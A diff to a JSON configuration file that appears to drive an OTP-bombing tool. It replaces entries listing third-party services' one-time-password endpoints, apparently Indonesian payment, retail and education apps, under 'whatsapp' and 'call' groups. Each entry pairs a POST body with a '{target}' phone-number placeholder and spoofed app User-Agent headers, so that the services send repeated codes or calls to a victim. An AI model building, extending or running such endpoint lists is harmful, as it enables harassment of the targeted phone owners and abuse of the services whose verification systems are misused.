@@ -1,41 +1,34 @@
 {
   "whatsapp": [
     {
-      "name": "KREDIT-PINTAR",
-      "url": "https://api.kreditpintar.com/v1/auth/otp",
+      "name": "OTOMAX-PAY",
+      "url": "https://api.otomax-payment.com/v1/auth/otp",
       "method": "POST",
-      "data": {"phone": "{target}", "category": "SIGN_IN"},
-      "headers": {"Content-Type": "application/json", "User-Agent": "okhttp/4.9.1"}
+      "data": {"phone": "{target}", "device": "android"},
+      "headers": {"Content-Type": "application/json", "User-Agent": "okhttp/4.10.0"}
     },
     {
-      "name": "MATAHARI-NEW",
-      "url": "https://api.matahari.com/v1/auth/otp",
+      "name": "KURSUS-LOKAL",
+      "url": "https://dashboard.skillacademy.com/api/v1/auth/otp",
       "method": "POST",
-      "data": {"phone": "{target}", "type": "register"},
+      "data": {"phoneNumber": "{target}"},
       "headers": {"User-Agent": "Mozilla/5.0"}
-    },
-    {
-      "name": "ALADIN-OTP",
-      "url": "https://api.aladinbank.id/v1/otp",
-      "method": "POST",
-      "data": {"phone_number": "{target}"},
-      "headers": {"Content-Type": "application/json"}
     }
   ],
   "call": [
     {
-      "name": "KLIKDOKTER-CALL",
-      "url": "https://api.klikdokter.com/v1/auth/otp",
+      "name": "PULSA-LAPAK",
+      "url": "https://api.lapakpulsa.id/v2/otp/call",
       "method": "POST",
-      "data": {"phone": "{target}", "type": "call"},
-      "headers": {"User-Agent": "Mozilla/5.0"}
+      "data": {"msisdn": "{target}"},
+      "headers": {"X-Requested-With": "XMLHttpRequest"}
     },
     {
-      "name": "ASTRA-PAY",
-      "url": "https://api.astrapay.com/v1/otp",
+      "name": "BOKU-PAY",
+      "url": "https://api.boku.com/v1/verify",
       "method": "POST",
-      "data": {"phone": "{target}"},
-      "headers": {"User-Agent": "okhttp/3.12.1"}
+      "data": {"number": "{target}"},
+      "headers": {"User-Agent": "Dalvik/2.1.0"}
     }
   ]
 }
